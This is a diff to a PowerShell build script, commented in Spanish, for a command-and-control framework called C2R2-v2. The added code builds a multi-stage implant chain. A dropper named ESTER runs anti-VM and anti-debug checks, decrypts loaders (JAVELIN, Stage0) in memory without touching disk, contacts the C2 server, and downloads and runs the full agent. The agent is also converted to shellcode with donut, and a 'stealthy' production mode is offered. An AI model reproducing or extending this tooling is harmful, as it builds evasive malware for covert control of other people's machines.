@@ -8,6 +8,7 @@ param(
     [string]$AgentName = "agent",
     [switch]$Production,
     [switch]$NoCache,
+    [switch]$MultiStage,
     [switch]$Help
 )
 
@@ -31,6 +32,7 @@ if ($Help) {
     Write-Host "  -ServerPort <PORT>   Puerto del servidor C2 (default: 4444)"
     Write-Host "  -AgentName <NAME>    Nombre del agente (default: agent)"
     Write-Host "  -Production          Compilar en modo producción (stealthy)"
+    Write-Host "  -MultiStage          Compilar sistema multi-stage (ESTER→JAVELIN→Stage0)"
     Write-Host "  -NoCache             Forzar rebuild limpiando target/"
     Write-Host "  -Help                Mostrar esta ayuda"
     Write-Host ""
@@ -38,6 +40,7 @@ if ($Help) {
     Write-Host "  .\build-all.ps1 -ServerIP 192.168.1.10 -ServerPort 4444"
     Write-Host "  .\build-all.ps1 -ServerIP 181.231.253.69 -Production"
     Write-Host "  .\build-all.ps1 -AgentName agent-prod -Production"
+    Write-Host "  .\build-all.ps1 -ServerIP 192.168.1.10 -MultiStage -Production"
     exit 0
 }
 
@@ -52,6 +55,10 @@ if ($Production) {
     Write-Color "PRODUCCIÓN (stealthy)" Green
 } else {
     Write-Color "DESARROLLO (debug)" Green
+}
+if ($MultiStage) {
+    Write-Host "   • Multi-Stage: " -NoNewline
+    Write-Color "ACTIVADO (ESTER→JAVELIN→Stage0)" Green
 }
 Write-Host ""
 
@@ -100,6 +107,28 @@ Write-Color "✓ WSL detectado" Green
 Write-Host ""
 
 # ============================================================================
+# Configurar entorno de Visual Studio (necesario para builds Windows)
+# ============================================================================
+$vsWhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
+if (Test-Path $vsWhere) {
+    $vsPath = & $vsWhere -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2>$null
+    if ($vsPath) {
+        $vcvarsall = Join-Path $vsPath "VC\Auxiliary\Build\vcvars64.bat"
+        if (Test-Path $vcvarsall) {
+            Write-Color "⚙️  Configurando entorno Visual Studio..." Cyan
+            # Ejecutar vcvars64.bat y capturar las variables de entorno
+            cmd /c "call `"$vcvarsall`" && set" 2>$null | ForEach-Object {
+                if ($_ -match "^([^=]+)=(.*)$") {
+                    [System.Environment]::SetEnvironmentVariable($matches[1], $matches[2], "Process")
+                }
+            }
+            Write-Color "✓ Entorno Visual Studio configurado" Green
+        }
+    }
+}
+Write-Host ""
+
+# ============================================================================
 # 1. Compilar Servidor en WSL (Linux x86_64)
 # ============================================================================
 Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
@@ -121,7 +150,7 @@ if ($LASTEXITCODE -ne 0) {
 Write-Color "✓ Rust disponible en WSL" Green
 
 # Compilar en WSL para x86_64
-wsl bash -c "source ~/.cargo/env && cd /mnt/e/repos/C2R2-v2 && cargo build --release --package c2r2-server 2>&1" | ForEach-Object {
+wsl bash -c "source ~/.cargo/env && cd /mnt/e/repos/C2R2-v2.2 && cargo build --release --package c2r2-server 2>&1" | ForEach-Object {
     if ($_ -match "error\[|failed") {
         Write-Color $_ Red
     } elseif ($_ -match "warning:") {
@@ -168,8 +197,12 @@ if ($LASTEXITCODE -ne 0) {
 
 Write-Color "✓ Target ARM64 disponible" Green
 
+# Obtener el path WSL del directorio actual
+$currentPath = (Get-Location).Path
+$wslPath = $currentPath -replace '\\', '/' -replace '^([A-Za-z]):', { '/mnt/' + $_.Groups[1].Value.ToLower() }
+
 # Compilar en WSL para ARM64
-wsl bash -c "source ~/.cargo/env && cd /mnt/e/repos/C2R2-v2 && cargo build --release --package c2r2-server --target aarch64-unknown-linux-gnu 2>&1" | ForEach-Object {
+wsl bash -c "source ~/.cargo/env && cd $wslPath && cargo build --release --package c2r2-server --target aarch64-unknown-linux-gnu 2>&1" | ForEach-Object {
     if ($_ -match "error\[|failed") {
         Write-Color $_ Red
     } elseif ($_ -match "warning:") {
@@ -242,6 +275,25 @@ pub const C2_SERVER: &str = "${serverAddress}";
 Set-Content -Path "agent\src\config.rs" -Value $configContent -NoNewline
 Write-Color "✓ Configuración generada con soporte para binary patching" Green
 
+# Configurar entorno de Visual Studio para compilar aws-lc-sys
+$vsWhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
+if (Test-Path $vsWhere) {
+    $vsPath = & $vsWhere -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2>$null
+    if ($vsPath) {
+        $vcvarsall = Join-Path $vsPath "VC\Auxiliary\Build\vcvars64.bat"
+        if (Test-Path $vcvarsall) {
+            Write-Color "⚙️  Configurando entorno Visual Studio..." Cyan
+            # Ejecutar vcvars64.bat y capturar las variables de entorno
+            cmd /c "call `"$vcvarsall`" && set" 2>$null | ForEach-Object {
+                if ($_ -match "^([^=]+)=(.*)$") {
+                    [System.Environment]::SetEnvironmentVariable($matches[1], $matches[2], "Process")
+                }
+            }
+            Write-Color "✓ Entorno Visual Studio configurado" Green
+        }
+    }
+}
+
 cargo build --release --package agent --features $agentFeatures 2>&1 | ForEach-Object {
     if ($_ -match "error|failed") {
         Write-Color $_ Red
@@ -257,12 +309,112 @@ cargo build --release --package agent --features $agentFeatures 2>&1 | ForEach-O
 if ($LASTEXITCODE -eq 0) {
     Copy-Item "target\release\agent.exe" "dist\${AgentName}.exe" -Force
     Write-Color "✅ Agent compilado: dist\${AgentName}.exe" Green
+
+    # Convertir agent.exe a shellcode usando donut (para Stage0 in-memory exec)
+    Write-Color "🍩 Convirtiendo agent.exe a shellcode para Stage0..." Cyan
+    $donutExe = Join-Path $PSScriptRoot "donut_v1.1\donut.exe"
+    if (Test-Path $donutExe) {
+        $agentExePath = "dist\${AgentName}.exe"
+        $agentBinPath = "dist\${AgentName}.bin"
+        & $donutExe -a 2 -f 1 -x 1 -e 3 -i $agentExePath -o $agentBinPath 2>&1 | Out-Null
+        if (Test-Path $agentBinPath) {
+            $shellcodeSize = (Get-Item $agentBinPath).Length
+            Write-Color "✅ Agent shellcode: ${agentBinPath} ($shellcodeSize bytes)" Green
+        } else {
+            Write-Color "⚠️  No se pudo generar agent.bin" Yellow
+        }
+    } else {
+        Write-Color "⚠️  donut.exe no encontrado" Yellow
+    }
 } else {
     Write-Color "❌ Error compilando agent" Red
     exit 1
 }
 
 Write-Host ""
+
+# ============================================================================
+# 4. Compilar Multi-Stage System (Opcional)
+# ============================================================================
+if ($MultiStage) {
+    Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
+    Write-Color "📦 [4/4] Compilando sistema multi-stage con builder + donut..." Yellow
+    Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
+    
+    # Verificar que donut.exe esté disponible (no usamos Python module)
+    Write-Color "🍩 Verificando donut.exe para conversión EXE→Shellcode..." Cyan
+    $donutExe = Join-Path $PSScriptRoot "donut_v1.1\donut.exe"
+    if (-not (Test-Path $donutExe)) {
+        Write-Color "❌ donut.exe no encontrado en: $donutExe" Red
+        Write-Color "   Descarga donut desde: https://github.com/TheWover/donut/releases" Yellow
+        Write-Color "   Extrae el contenido en: $PSScriptRoot\donut_v1.1\" Yellow
+        exit 1
+    }
+    Write-Color "✅ donut.exe encontrado: $donutExe" Green
+
+    # Verificar que el script exe_to_shellcode.py exista
+    $exeToShellcodeScript = Join-Path $PSScriptRoot "builder\scripts\exe_to_shellcode.py"
+    if (-not (Test-Path $exeToShellcodeScript)) {
+        Write-Color "❌ exe_to_shellcode.py no encontrado en: $exeToShellcodeScript" Red
+        exit 1
+    }
+    Write-Color "✅ exe_to_shellcode.py encontrado" Green
+    
+    Write-Color "⚙️  Usando C2R2 Builder para construir ESTER→JAVELIN→Stage0..." Cyan
+    
+    # Primero compilar el builder si no existe
+    if (-not (Test-Path "target\debug\builder.exe") -and -not (Test-Path "target\release\builder.exe")) {
+        Write-Color "⚙️  Compilando builder..." Cyan
+        cargo build --package builder 2>&1 | Out-Null
+    }
+    
+    # Usar el builder para construir el sistema multi-stage
+    $builderArgs = @(
+        "run",
+        "--package", "builder",
+        "--",
+        "build-staged",
+        "--server", "${ServerIP}:${ServerPort}",
+        "--output", "dist"
+    )
+    
+    if ($Production) {
+        $builderArgs += "--production"
+    }
+    
+    cargo @builderArgs 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed|Error") {
+            Write-Color $_ Red
+        } elseif ($_ -match "warning|⚠️") {
+            Write-Color $_ Yellow
+        } elseif ($_ -match "Compiling|Finished|✅|📦|🔧") {
+            Write-Color $_ Cyan
+        } elseif ($_ -match "━━━") {
+            Write-Color $_ Blue
+        } else {
+            Write-Host $_
+        }
+    }
+    
+    if ($LASTEXITCODE -eq 0) {
+        Write-Color "✅ Sistema multi-stage compilado exitosamente!" Green
+        Write-Host ""
+        Write-Color "📋 Stages generados:" Yellow
+        Write-Host "   • dist\ester.exe - Stage 1: Dropper/Validator (ejecuta todo el flujo)"
+        Write-Host ""
+        Write-Color "ℹ️  Flujo de ejecución:" Cyan
+        Write-Host "   1. ester.exe valida el entorno (anti-VM, anti-debug)"
+        Write-Host "   2. Descifra y carga JAVELIN en memoria (no toca disco)"
+        Write-Host "   3. JAVELIN descifra y carga Stage0 en memoria"
+        Write-Host "   4. Stage0 contacta C2 en ${ServerIP}:${ServerPort}"
+        Write-Host "   5. Descarga y ejecuta el agent completo desde el C2"
+    } else {
+        Write-Color "❌ Error compilando sistema multi-stage" Red
+        Write-Color "ℹ️  Revisa los mensajes de error arriba" Yellow
+    }
+    
+    Write-Host ""
+}
 
 # ============================================================================
 # Verificar resultados
@@ -280,6 +432,22 @@ Get-ChildItem "dist" -File | ForEach-Object {
 }
 
 # Crear archivo BUILD_INFO
+$componentsList = @"
+- c2r2-server-x86_64 (Linux x86_64, built in WSL)
+- c2r2-server-arm64 (Linux ARM64 for Raspberry Pi, built in WSL)
+- ${AgentName}.exe (Windows x86_64)
+"@
+
+if ($MultiStage) {
+    $componentsList += @"
+
+Multi-Stage Components:
+- ester.exe (Stage 1: Dropper/Validator)
+- javelin.exe (Stage 2: In-Memory Loader)
+- stage0.exe (Stage 3: Bootstrap Payload)
+"@
+}
+
 $buildInfo = @"
 C2R2-v2 Build Information
 =========================
@@ -289,11 +457,10 @@ Server Port: $ServerPort
 Agent Name: ${AgentName}.exe
 Build Mode: $(if ($Production) { "PRODUCTION" } else { "DEVELOPMENT" })
 Features: $agentFeatures
+Multi-Stage: $(if ($MultiStage) { "ENABLED" } else { "DISABLED" })
 
 Components:
-- c2r2-server-x86_64 (Linux x86_64, built in WSL)
-- c2r2-server-arm64 (Linux ARM64 for Raspberry Pi, built in WSL)
-- ${AgentName}.exe (Windows x86_64)
+$componentsList
 "@
 
 $buildInfo | Out-File "dist\BUILD_INFO.txt" -Encoding UTF8
@@ -327,3 +494,4 @@ Write-Color "Para Windows (Agent):" Cyan
 Write-Host "   • Ejecuta: " -NoNewline
 Write-Color "dist\${AgentName}.exe" Green
 Write-Host ""
+
